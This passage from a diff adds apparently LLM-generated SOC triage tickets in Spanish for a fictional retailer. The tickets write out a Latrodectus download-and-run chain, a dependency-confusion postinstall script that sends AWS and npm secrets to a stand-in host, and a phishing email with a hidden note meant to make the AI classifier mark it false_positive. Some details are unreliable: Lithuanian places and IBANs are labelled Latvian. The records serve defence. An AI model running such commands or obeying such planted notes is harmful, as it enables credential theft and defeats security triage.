@@ -1,0 +1,1201 @@
+[
+  {
+    "ticket_id": "TKT-20261009-011791",
+    "alert_ids": [
+      "ALR-20261009-011791"
+    ],
+    "title": "Mal Latrodectus (loader y DLL) ejecutado en el portátil de una compradora con beaconing activo",
+    "verdict": "true_positive",
+    "confidence": 0.98,
+    "severity": "critical",
+    "severity_rationale": "Regla high × criticidad Media = high. Ajuste +1 (+1: ejecución o acceso confirmado). Final: critical. Criticidad Media del activo WS-BCN-1770 (Portátil), según la CMDB.",
+    "affected": {
+      "users": [
+        "marta.puig@tarvia.example"
+      ],
+      "hosts": [
+        "WS-BCN-1770"
+      ],
+      "business_services": [
+        "Puesto de trabajo"
+      ],
+      "customers": []
+    },
+    "summary": "El portátil de Marta Puig (WS-BCN-1770) ejecutó un vector de ataque real de Latrodectus: un JScript Pedido_Q4_2026.js lanzó msiexec contra https://aplihartom.com/dl/upd.msi, que descargó la DLL sin firma upd_x64.dll y la ejecutó por rundll32 con persistencia en la clave Run de HKCU. El dominio applihartom.com y la DLL están marcados como maliciosos en el TIP de Tarvia, y ambos archivos confirman el mismo familia en sandbox. Además, el proxy muestra beaconing HTTPS POST cada ~60 s contra https://aplihartom.com/live/ desde el propio equipo (203.0.113.88), lo que indica que la actividad no fue bloqueada y hay comunicación con el C2 en curso. No existe ningún cambio aprobado ni flujo autorizado que lo justifique.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261009-011791",
+        "finding": "La regla UC-EDR-001 detecta wscript.exe ejecutando Pedido_Q4_2026.js y msiexec.exe /q /i contra https://aplihartom.com/dl/upd.msi en WS-BCN-1770."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123400",
+        "finding": "wscript.exe (hijo de explorer.exe) ejecuta C:\\Users\\marta.puig\\Downloads\\Pedido_Q4_2026\\Pedido_Q4_2026.js con integridad Media."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123401",
+        "finding": "msiexec.exe lanza msiexec.exe /q /i https://aplihartom.com/dl/upd.msi con padre wscript.exe."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123402",
+        "finding": "msiexec.exe crea C:\\Users\\marta.puig\\AppData\\Roaming\\Custom_update\\upd_x64.dll sin firma."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123403",
+        "finding": "rundll32.exe ejecuta upd_x64.dll con export 'homq' a partir de msiexec.exe."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123404",
+        "finding": "rundll32.exe escribe HKCU\\...\\Run\\Update apuntando a la DLL (persistencia confirmada)."
+      },
+      {
+        "source": "tip",
+        "event_id": "",
+        "finding": "aplihartom.com está marcado malicious en el TIP (confidence 85, familia Latrodectus, tags c2/loader)."
+      },
+      {
+        "source": "tip",
+        "event_id": "",
+        "finding": "La sha256 de upd_x64.dll está marcada malicious (confidence 75, familia Latrodectus, tags loader/dll)."
+      },
+      {
+        "source": "sandbox",
+        "event_id": "6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+        "finding": "Pedido_Q4_2026.js marcado malicious (score 96): JScript ofuscado que lanza msiexec /q /i contra URL remota."
+      },
+      {
+        "source": "sandbox",
+        "event_id": "0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+        "finding": "upd_x64.dll marked malicious (score 98): persistencia en Run, beaconing HTTPS POST cada 60 s a /live/, descarga de segunda fase."
+      },
+      {
+        "source": "proxy",
+        "event_id": "PRX-0211362",
+        "finding": "El equipo envía HTTPS POST a https://aplihartom.com/live/ (203.0.113.88) con status 200 a las 09:31:10, tras la ejecución."
+      },
+      {
+        "source": "proxy",
+        "event_id": "PRX-0211361",
+        "finding": "Otra llamada POST a https://aplihartom.com/live/ (203.0.113.88) con status 200 a las 09:30:10, indicando comunicación repetida con el C2."
+      },
+      {
+        "source": "cambios_aprobados",
+        "event_id": "",
+        "finding": "No hay cambios aprobados ni flujos autorizados que cubran esta actividad."
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "aplihartom.com",
+        "type": "domain",
+        "source": "ti_feed",
+        "result": "malicious, Latrodectus, confianza 85, etiquetas: c2,loader"
+      },
+      {
+        "indicator": "6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+        "type": "sha256",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+        "type": "sha256",
+        "source": "ti_feed",
+        "result": "malicious, Latrodectus, confianza 75, etiquetas: loader,dll"
+      },
+      {
+        "indicator": "6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+        "type": "sha256",
+        "source": "sandbox",
+        "result": "malicious, puntuación 96, Latrodectus (loader)"
+      },
+      {
+        "indicator": "0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+        "type": "sha256",
+        "source": "sandbox",
+        "result": "malicious, puntuación 98, Latrodectus"
+      }
+    ],
+    "mitre": [
+      "T1204.002",
+      "T1059.007",
+      "T1218.007",
+      "T1218.011",
+      "T1547.001",
+      "T1071.001"
+    ],
+    "recommended_actions": [
+      {
+        "action": "block_ioc",
+        "target": "aplihartom.com, 203.0.113.88, sha256 0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697, sha256 6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+        "requires_approval": false,
+        "justification": "Bloquear el dominio C2, la IP y los hashes en proxy, correo y EDR para cortar la comunicación y evitar re-descargas.",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      },
+      {
+        "action": "purge_email",
+        "target": "buzón de marta.puig@tarvia.example",
+        "requires_approval": false,
+        "justification": "Revisar y purgar cualquier correo malicioso que distribuyó el adjunto Pedido_Q4_2026.js si se originó por correo.",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      },
+      {
+        "action": "revoke_sessions",
+        "target": "marta.puig@tarvia.example",
+        "requires_approval": true,
+        "justification": "Revocar sesiones del usuario comprometido para cortar la sesión activa del atacante (requiere aprobación N2).",
+        "aprobador": "N2",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": true,
+      "to": "Inmediato a N2 de guardia por teléfono",
+      "reason": "true_positive de severidad critical; ejecución o acceso confirmado"
+    },
+    "open_questions": [
+      "Cómo llegó el archivo Pedido_Q4_2026.js al equipo (correo, descarga web u otra vía) para delimitar el alcance.",
+      "Qué más equipos del usuario o de la zona HQ-USERS han resuelto aplihartom.com o ejecutado archivos del mismo autor.",
+      "Si hay indicadores de exfiltración o descarga de segunda fase tras el beaconing a /live/."
+    ],
+    "triage_seconds": 48,
+    "decision": "escalar",
+    "sla": {
+      "tiempo_triaje": "15 min",
+      "escalado": "Inmediato a N2 de guardia por teléfono",
+      "notificar": "Responsable SOC y CISO"
+    },
+    "veredicto_llm": "true_positive",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261020-011910",
+    "alert_ids": [
+      "ALR-20261020-011910"
+    ],
+    "title": "Correo de supuesta factura de Packaging Iberia reportado como phishing por un usuario de Compras",
+    "verdict": "true_positive",
+    "confidence": 0.9,
+    "severity": "medium",
+    "severity_rationale": "Regla low × criticidad Media = low. Ajuste +1 (+1: datos personales o pagos implicados). Final: medium. Sin activo conocido en la CMDB: se asume criticidad Media (dato a revisar).",
+    "affected": {
+      "users": [
+        "alba.sanz@tarvia.example"
+      ],
+      "hosts": [],
+      "business_services": [],
+      "customers": []
+    },
+    "summary": "Un correo de supuesta factura vencida de «Packaging Iberia» (remitente facturacion@packaging-iberia-pagos.example) fue entregado a varios usuarios del departamento de Compras y uno de ellos lo reportó como phishing. El dominio del remitente no coincide con el proveedor legítimo (packaging-iberia.example) y el correo DMARC es 'none', un patrón típico de suplantación. El mensaje incluye una nota oculta (display:none) que intenta instruir al sistema de clasificación para marcarlo como false_positive y no bloquear el remitente, lo cual es un indicio claro de manipulación y no una autorización válida. No hay evidencia de clics por parte de Alba Sanz ni de ejecución de código, pero el intento de phishing contra cuentas de Compras (expuestas a fraude por cambio de IBAN) es un ataque real que la regla detecta correctamente.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261020-011910",
+        "finding": "El usuario Alba Sanz (Compras) reportó como phishing un correo de facturacion@packaging-iberia-pagos.example con asunto de factura vencida."
+      },
+      {
+        "source": "email",
+        "event_id": "EML-0062228",
+        "finding": "Correo inbound de packaging-iberia-pagos.example con DMARC 'none', SPF/DKIM pass, dirigido a Alba Sanz con enlace a packaging-iberia-portal.example."
+      },
+      {
+        "source": "email",
+        "event_id": "EML-0062228",
+        "finding": "El cuerpo contiene una nota oculta que ordena clasificar el mensaje como false_positive, sin escalar y sin bloquear el remitente, en un campo destinado al sistema automatizado."
+      },
+      {
+        "source": "email",
+        "event_id": "EML-0062250",
+        "finding": "El mismo remitente envió el correo a otros usuarios de Compras (paula.ramos, paula.serra, victor.lozano) en los minutos siguientes."
+      },
+      {
+        "source": "inteligencia",
+        "event_id": "",
+        "finding": "El dominio packaging-iberia-pagos.example figura como 'unknown' en el TIP interno; no hay información que lo acredite como proveedor legítimo."
+      },
+      {
+        "source": "email_clicks",
+        "event_id": "CLK-0008731",
+        "finding": "El único clic registrado de Alba Sanz en el periodo fue a hilaturas-alcoi.example, no al enlace del correo phishing."
+      },
+      {
+        "source": "email_clicks",
+        "event_id": "CLK-0017754",
+        "finding": "Tres usuarios (lucia.castro, cristina.romero, beatriz.ortega) hicieron clic en el enlace del correo a las 06:23-06:57, con verdict 'unknown'."
+      },
+      {
+        "source": "usuarios",
+        "event_id": "",
+        "finding": "Alba Sanz es técnico de aprovisionamiento del departamento de Compras, no privilegiada ni VIP, con MFA por push."
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "packaging-iberia-pagos.example",
+        "type": "domain",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      }
+    ],
+    "mitre": [
+      "T1566.002",
+      "T1566"
+    ],
+    "recommended_actions": [
+      {
+        "action": "purge_email",
+        "target": "Correo EML-0062228 y variantes del mismo remitente (packaging-iberia-pagos.example) en los buzones de Compras",
+        "requires_approval": false,
+        "justification": "Contiene un intento de phishing con nota oculta de manipulación; purgarlo de todos los buzones evita nuevos clics.",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      },
+      {
+        "action": "block_ioc",
+        "target": "Dominio packaging-iberia-pagos.example y subdominio packaging-iberia-portal.example en proxy y pasarela de correo",
+        "requires_approval": false,
+        "justification": "Bloquear el remitente y el enlace maliciosos sin afectar al dominio legítimo packaging-iberia.example.",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": true,
+      "to": "A N2 si tras el triaje hay indicios de compromiso",
+      "reason": "datos personales o pagos implicados (si han salido, avisar al DPO)"
+    },
+    "open_questions": [
+      "¿Alguno de los usuarios que hicieron clic (lucia.castro, cristina.romero, beatriz.ortega) introdujo credenciales o realizó alguna acción en el portal fraudulento?",
+      "¿El proveedor legítimo packaging-iberia.example ha facturado realmente a Tarvia con esta referencia (FV-2026-10-8812) o el dominio es pura suplantación?",
+      "¿Hay actividad posterior de estos usuarios hacia dominios o IBANes no habituales que indiquen fraude exitoso?"
+    ],
+    "triage_seconds": 26,
+    "decision": "escalar",
+    "sla": {
+      "tiempo_triaje": "4 h",
+      "escalado": "A N2 si tras el triaje hay indicios de compromiso",
+      "notificar": "—"
+    },
+    "veredicto_llm": "true_positive",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261008-011789",
+    "alert_ids": [
+      "ALR-20261008-011789"
+    ],
+    "title": "Correo de suplantación solicitando cambio de IBAN de proveedor por 148.320 €",
+    "verdict": "true_positive",
+    "confidence": 0.92,
+    "severity": "high",
+    "severity_rationale": "Regla medium × criticidad Media = medium. Ajuste +1 (+1: ejecución o acceso confirmado; +1: datos personales o pagos implicados). Final: high. Sin activo conocido en la CMDB: se asume criticidad Media (dato a revisar).",
+    "affected": {
+      "users": [
+        "laura.ferrer2@tarvia.example",
+        "jordi.serra2@tarvia.example"
+      ],
+      "hosts": [],
+      "business_services": [],
+      "customers": []
+    },
+    "summary": "Una alerta de pasarela de correo detecta un intento de fraude por cambio de IBAN (BEEF/whaling financiero) dirigido a Jordi Serra (DPO) en nombre de Laura Ferrer (E-commerce). El correo, enviado desde la IP 203.0.113.45 (hosting en Ámsterdam, sin inteligencia de amenaza pero no legítima de Tarvia), solicita actualizar el IBAN de Textiles Montroig a una cuenta de Letonia (LT) para un pago de 148.320,00 € antes del viernes, con un PDF adjunto de «certificado de titularidad». La regla acierta: es una solicitud real de modificación de datos bancarios de proveedor, un ataque en curso aunque ningún control lo haya bloqueado. No existe autorización citable y el DPO destinatario está de vacaciones solo a partir del 26/10, sin relación con este correo del 8/10.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261008-011789",
+        "finding": "La regla UC-EML-004 (Financial Theft, T1657) detecta un correo que modifica un IBAN de proveedor, con IBAN de Letonia, importe 148.320,00 € y IP de envío 203.0.113.45."
+      },
+      {
+        "source": "alerta",
+        "event_id": "EML-0062205",
+        "finding": "El correo EML-0062205, de laura.ferrer2@tarvia.example a jordi.serra2@tarvia.example, pide actualizar el IBAN de Textiles Montroig a LT12 3250 0000 1234 5678 antes del pago del viernes; adjunta un PDF de «certificado de titularidad»."
+      },
+      {
+        "source": "email",
+        "event_id": "EML-0062205",
+        "finding": "El remitente usa una IP de hosting en Ámsterdam (203.0.113.45) aunque SPF/DKIM/DMARC dan pass, lo que sugiere suplantación del dominio y no un envío legítimo interno."
+      },
+      {
+        "source": "email",
+        "event_id": "EML-0010743",
+        "finding": "Jorges recibió el 8/10 a las 05:46 una factura real de Textiles Montroig (facturacion@textiles-montroig.example), lo que da contexto pero no autoriza ningún cambio de IBAN."
+      },
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261008-011789",
+        "finding": "El DPO Jordi Serra está en el destinatario; su evento HR solo indica vacaciones del 26 al 30/10, sin relación con este correo del 8/10."
+      },
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261008-011789",
+        "finding": "La IP 203.0.113.45 figura como hosting en Ámsterdam y sin inteligencia de amenaza disponible; no corresponde a un servicio legítimo de Tarvia ni a un proveedor conocido."
+      },
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261008-011789",
+        "finding": "No hay cambios aprobados ni flujos autorizados que cubran esta solicitud de cambio de IBAN."
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "203.0.113.45",
+        "type": "ip",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "203.0.113.45",
+        "type": "ip",
+        "source": "geoip_asn",
+        "result": "Hosting Ámsterdam BV (simulado), Ámsterdam, NL, hosting"
+      }
+    ],
+    "mitre": [
+      "T1657"
+    ],
+    "recommended_actions": [
+      {
+        "action": "block_ioc",
+        "target": "203.0.113.45",
+        "requires_approval": false,
+        "justification": "Bloquear la IP de envío del correo fraudulento en proxy, correo y EDR para impedir nuevos intentos desde el mismo origen.",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      },
+      {
+        "action": "purge_email",
+        "target": "<CAF8x9-bec-0001@tarvia.example>",
+        "requires_approval": false,
+        "justification": "Purgar el correo fraudulento de los buzones de los destinatarios para evitar que se procese el cambio de IBAN.",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      },
+      {
+        "action": "block_ioc",
+        "target": "LT12 3250 0000 1234 5678",
+        "requires_approval": false,
+        "justification": "Registrar el IBAN fraudulento para bloquear pagos y alertar a Tesorería antes del pago del viernes.",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": true,
+      "to": "A N2 en la misma jornada",
+      "reason": "true_positive de severidad high; ejecución o acceso confirmado; datos personales o pagos implicados (si han salido, avisar al DPO); posible fraude económico"
+    },
+    "open_questions": [
+      "¿Se ha contactado con Textiles Montroig por otro canal para confirmar si realmente cambió de cuenta bancaria antes de que Tesorería procese cualquier pago?",
+      "¿Hay registros de que el correo haya sido abierto o que el enlace/archivo adjunto haya sido interactuado por el destinatario (email_clicks)?",
+      "¿Existe algún correo previo o posterior de Textiles Montroig que confirme o refute un cambio real de IBAN?"
+    ],
+    "triage_seconds": 36,
+    "decision": "escalar",
+    "sla": {
+      "tiempo_triaje": "30 min",
+      "escalado": "A N2 en la misma jornada",
+      "notificar": "Responsable SOC"
+    },
+    "veredicto_llm": "true_positive",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261012-011829",
+    "alert_ids": [
+      "ALR-20261012-011829"
+    ],
+    "title": "AnyDesk no autorizado en portátil de tienda con sesión entrante y acceso a compartida de cierre",
+    "verdict": "true_positive",
+    "confidence": 0.9,
+    "severity": "high",
+    "severity_rationale": "Regla medium × criticidad Media = medium. Ajuste +1 (+1: ejecución o acceso confirmado). Final: high. Criticidad Media del activo LT-T07-02 (Portátil), según la CMDB.",
+    "affected": {
+      "users": [
+        "andrea.molina2@tarvia.example"
+      ],
+      "hosts": [
+        "LT-T07-02"
+      ],
+      "business_services": [
+        "Operación de tienda"
+      ],
+      "customers": []
+    },
+    "summary": "La dependienta Andrea Molina ejecutó AnyDesk (herramienta de acceso remoto no aprobada en Tarvia) en el portátil LT-T07-02 de la Tienda 07, tras descargarlo desde download.anydesk.com minutos antes. Se estableció una sesión de control remoto entrante desde una IP de Marruecos (198.51.100.210) y, desde el propio AnyDesk, se lanzó PowerShell para recorrer el recurso compartido \\\\FS01\\Tiendas\\Cierres. No existe ningún cambio aprobado ni flujo que autorice el uso de AnyDesk, y la única RMM permitida es TeamViewer Corporate gestionado por IT. La actividad se ejecutó sin que ningún control la bloqueara, por lo que constituye un intento de acceso remoto no autorizado con posible exfiltración de datos de cierre de tienda.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261012-011829",
+        "finding": "La regla UC-EDR-005 detecta ejecución de AnyDesk (RMM no aprobada) en LT-T07-02, con sesión entrante desde Marruecos y sin ticket de IT."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123426",
+        "finding": "AnyDesk.exe (firmado por AnyDesk Software GmbH) se ejecutó desde C:\\Users\\andrea.molina\\Downloads\\, con padre msedge.exe."
+      },
+      {
+        "source": "proxy",
+        "event_id": "PRX-0212611",
+        "finding": "Se descargó AnyDesk.exe (5,1 MB) desde download.anydesk.com a las 14:02, tres minutos antes de su ejecución."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123427",
+        "finding": "AnyDesk.exe estableció conexión entrante de control remoto desde 198.51.100.210 (Casablanca, Marruecos), un proveedor móvil con proxy residencial."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0123428",
+        "finding": "PowerShell lanzado como hijo de AnyDesk ejecutó Get-ChildItem \\\\FS01\\Tiendas\\Cierres -Recurse, accediendo a datos de cierre de tiendas."
+      },
+      {
+        "source": "inteligencia",
+        "event_id": "",
+        "finding": "La IP 198.51.100.210 está como unknown y procede de Marruecos; el hash de AnyDesk.exe es unknown pero el sandbox lo confirma como binario legítimo (no malicioso en sí)."
+      },
+      {
+        "source": "activos",
+        "event_id": "",
+        "finding": "LT-T07-02 es un portátil de tienda (criticalidad Media), sin autorización para RMM no controladas por IT."
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "198.51.100.210",
+        "type": "ip",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "198.51.100.210",
+        "type": "ip",
+        "source": "geoip_asn",
+        "result": "Proveedor móvil (simulado), Casablanca, MA, proxy residencial"
+      },
+      {
+        "indicator": "a6a536a710731876ce49160473bc55b5a4143dd66a0695acd3cf9e8c716af333",
+        "type": "sha256",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "a6a536a710731876ce49160473bc55b5a4143dd66a0695acd3cf9e8c716af333",
+        "type": "sha256",
+        "source": "sandbox",
+        "result": "clean, puntuación 3"
+      }
+    ],
+    "mitre": [
+      "T1219"
+    ],
+    "recommended_actions": [
+      {
+        "action": "block_ioc",
+        "target": "198.51.100.210 y download.anydesk.com en proxy/EDR",
+        "requires_approval": true,
+        "justification": "Bloquear la IP de control remoto desde Marruecos y el origen de descarga para interrumpir el canal de C2 sin afectar servicios legítimos.",
+        "aprobador": "N2",
+        "permitida": true,
+        "nota": "Servicio de uso dual: no se bloquea globalmente sin N2."
+      },
+      {
+        "action": "purge_email",
+        "target": "",
+        "requires_approval": false,
+        "justification": "",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      },
+      {
+        "action": "disable_access_key",
+        "target": "",
+        "requires_approval": true,
+        "justification": "",
+        "aprobador": "N2",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": true,
+      "to": "A N2 en la misma jornada",
+      "reason": "true_positive de severidad high; ejecución o acceso confirmado"
+    },
+    "open_questions": [
+      "Existe algún ticket de IT o solicitud legítima pendiente que justifique el uso de AnyDesk por parte de la dependienta?",
+      "Qué datos se leyeron realmente de \\\\FS01\\Tiendas\\Cierres y ha habido transferencia saliente (posible exfiltración)?",
+      "La sesión entrante desde Marruecos sigue activa o ya se ha cerrado? Hay actividad posterior del proceso AnyDesk."
+    ],
+    "triage_seconds": 38,
+    "decision": "escalar",
+    "sla": {
+      "tiempo_triaje": "30 min",
+      "escalado": "A N2 en la misma jornada",
+      "notificar": "Responsable SOC"
+    },
+    "veredicto_llm": "true_positive",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261011-011877",
+    "alert_ids": [
+      "ALR-20261011-011877"
+    ],
+    "title": "Acceso VPN de Logisoft desde Letonia en domingo de madrugada",
+    "verdict": "needs_more_info",
+    "confidence": 0.45,
+    "severity": "medium",
+    "severity_rationale": "Regla low × criticidad Media = low. Ajuste +1 (+1: ejecución o acceso confirmado). Final: medium. Sin activo conocido en la CMDB: se asume criticidad Media (dato a revisar).",
+    "affected": {
+      "users": [
+        "ext.logisoft@tarvia.example"
+      ],
+      "hosts": [],
+      "business_services": [],
+      "customers": []
+    },
+    "summary": "La cuenta de proveedor ext.logisoft se conectó por VPN el domingo 11-oct a las 03:38 hora local (01:38 UTC) desde Vilna, Letonia (AS213790, Limited Network LTD), un origen no visto y fuera de su ventana contractual (lunes a viernes 8-18 h). La autenticación con TOTP fue aprobada, pero el dispositivo no es conforme (device_compliant=false) y el acceso se dirigió a WMS01 (10.40.2.10:3389) con 9 MB transmitidos. El único cambio aprobado (CHG-2026-1071) cubre una actualización del WMS el 16-oct, por lo que NO autoriza este acceso del 11-oct. La evidencia es contradictoria: el ASN figura como hosting y el evento de desconexión muestra un país distinto (Bulgaria), lo que sugiere posible suplantación del origen. No hay evidencia de actividad posterior ni de exfiltración, pero tampoco se descarta compromiso.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261011-011877",
+        "finding": "La regla UC-VPN-001 detecta una cuenta de tercero conectada fuera de su ventana contractual (L-V 8-18 h) y desde un ASN no visto; la alerta marca local_time como domingo 03:38 y ASN como Limited Network LTD"
+      },
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261011-011877",
+        "finding": "El usuario ext.logisoft está documentado como proveedor del WMS con origen habitual en Madrid (AS64650) y acceso solo a WMS01 por RDP"
+      },
+      {
+        "source": "alerta",
+        "event_id": "VPN-0010704",
+        "finding": "Evento VPN real: ext.logisoft se conecta a las 01:38 UTC desde 77.90.185.20 (Letonia) con MFA TOTP aprobado y device_compliant=false"
+      },
+      {
+        "source": "alerta",
+        "event_id": "FW-0026536",
+        "finding": "Firewall real: desde la IP asignada 10.99.60.10 se permite RDP (3389) hacia WMS01 (10.40.2.10) con 9.000.000 bytes transmitidos en zona LOGISTICS-IT"
+      },
+      {
+        "source": "alerta",
+        "event_id": "SIGN-0084059",
+        "finding": "IdP real: inicio de sesión VPN exitoso desde Vilna, Letonia, con MFA TOTP aprobado, device_compliant=false y conditional_access notApplied"
+      },
+      {
+        "source": "alerta",
+        "event_id": "VPN-0010705",
+        "finding": "Evento de desconexión a las 04:48 UTC desde la misma IP pero con país Bulgaria y 55 MB descargados, lo que contradice el origen reportado y sugiere posible manipulación del origen"
+      },
+      {
+        "source": "cambios_aprobados",
+        "event_id": "CHG-2026-1071",
+        "finding": "Existe un cambio aprobado para acceso de Logisoft fuera de horario, pero cubre el 16-oct 21:00-23:59, no el 11-oct de la alerta"
+      },
+      {
+        "source": "inteligencia",
+        "event_id": "77.90.185.20",
+        "finding": "La IP 77.90.185.20 es de AS213790 (Limited Network LTD), clasificada como hosting, no como proveedor de VPN ni TOR, sin marcadores maliciosos conocidos"
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "77.90.185.20",
+        "type": "ip",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "77.90.185.20",
+        "type": "ip",
+        "source": "geoip_asn",
+        "result": "Limited Network LTD, Vilna, LT, hosting"
+      }
+    ],
+    "mitre": [
+      "T1133"
+    ],
+    "recommended_actions": [
+      {
+        "action": "human_review",
+        "target": "ticket",
+        "requires_approval": true,
+        "justification": "needs_more_info: un analista debe revisar las preguntas abiertas",
+        "aprobador": "N1",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": false,
+      "to": "",
+      "reason": ""
+    },
+    "open_questions": [
+      "¿Es legítimo el acceso del domingo desde Letonia con un dispositivo no conforme, o la cuenta ext.logisoft ha sido comprometida?",
+      "¿Por qué el evento de desconexión muestra Bulgaria mientras la conexión se atribuye a Letonia?",
+      "¿Qué actividad real realizó ext.logisoft en WMS01 durante la sesión (archivos consultados, cambios)?",
+      "¿El dispositivo no conforme y el conditional_access no aplicado violan la política de acceso de Tarvia?"
+    ],
+    "triage_seconds": 11,
+    "decision": "revisar",
+    "sla": {
+      "tiempo_triaje": "4 h",
+      "escalado": "A N2 si tras el triaje hay indicios de compromiso",
+      "notificar": "—"
+    },
+    "veredicto_llm": "needs_more_info",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261013-011901",
+    "alert_ids": [
+      "ALR-20261013-011901"
+    ],
+    "title": "Confusión de dependencias en CI-RUNNER01: un paquete npm malicioso lee secretos de despliegue y exfiltra datos",
+    "verdict": "true_positive",
+    "confidence": 0.95,
+    "severity": "high",
+    "severity_rationale": "Regla medium × criticidad Alta = medium. Ajuste +1 (+1: ejecución o acceso confirmado; +1: identidad VIP o privilegiada). Final: high. Criticidad Alta del activo CI-RUNNER01 (Runner CI/CD), según la CMDB.",
+    "affected": {
+      "users": [],
+      "hosts": [
+        "CI-RUNNER01"
+      ],
+      "business_services": [
+        "Integración continua"
+      ],
+      "customers": []
+    },
+    "summary": "Durante el build ecom-frontend#1842 en CI-RUNNER01, el paquete tarvia-checkout-utils@9.9.1 (registro público npm) se instaló en lugar de @tarvia/checkout-utils@2.3.0 (registro interno), un caso clásico de dependency confusion. El script postinstall node scripts/telemetry.js leyó las variables de entorno AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, NPM_TOKEN y SENTRY_DSN, y envió 2,150 bytes por HTTPS a npm-telemetry-stats.example (203.0.113.170). El sandbox confirmó el paquete como malicioso (confusión de dependencias, puntuación 90/100) con las mismas señales de exfiltración. El runner CI-RUNNER01 es un activo de criticidad alta que contiene en variables de entorno la clave de despliegue de AWS (svc_ecom_deploy), por lo que es muy probable que las credenciales de AWS hayan quedado expuestas. La alerta es correcta y la actividad es maliciosa real; el firewall permitió la salida, por lo que no hubo contención.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261013-011901",
+        "finding": "La regla UC-DEV-001 detecta un build donde un script postinstall lee variables de entorno sensibles y conecta a un dominio nuevo; el paquete público tarvia-checkout-utils@9.9.1 sustituyó al interno @tarvia/checkout-utils@2.3.0."
+      },
+      {
+        "source": "cicd_builds",
+        "event_id": "CI-0000602",
+        "finding": "En el step npm ci se instaló tarvia-checkout-utils@9.9.1 desde registry.npmjs.org (público) cuando se esperaba @tarvia/checkout-utils 2.3.0 (registro interno), con sha256 f412c70f...a676c y postinstall node scripts/telemetry.js."
+      },
+      {
+        "source": "cicd_builds",
+        "event_id": "CI-0000603",
+        "finding": "El postinstall del paquete leyó AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, NPM_TOKEN y SENTRY_DSN, y ejecutó un POST https://npm-telemetry-stats.example/collect de 2,1 KB."
+      },
+      {
+        "source": "firewall",
+        "event_id": "FW-0026595",
+        "finding": "El firewall permitió (allow) la salida desde CI-RUNNER01 (172.16.10.21) a 203.0.113.170:443 por la regla AWS-CI-EGress, transfiriendo 2,150 bytes a EXTERNAL."
+      },
+      {
+        "source": "sandbox",
+        "event_id": "f412c70fef24e226c48b62c885087042fb88ddae0df4f4d5386f4b48156a676c",
+        "finding": "El sandbox clasificó el tgz como malicioso (confusión de dependencias, score 90): postinstall lee variables AWS_* y NPM_TOKEN y envía un JSON por HTTPS POST a npm-telemetry-stats.example (203.0.113.170)."
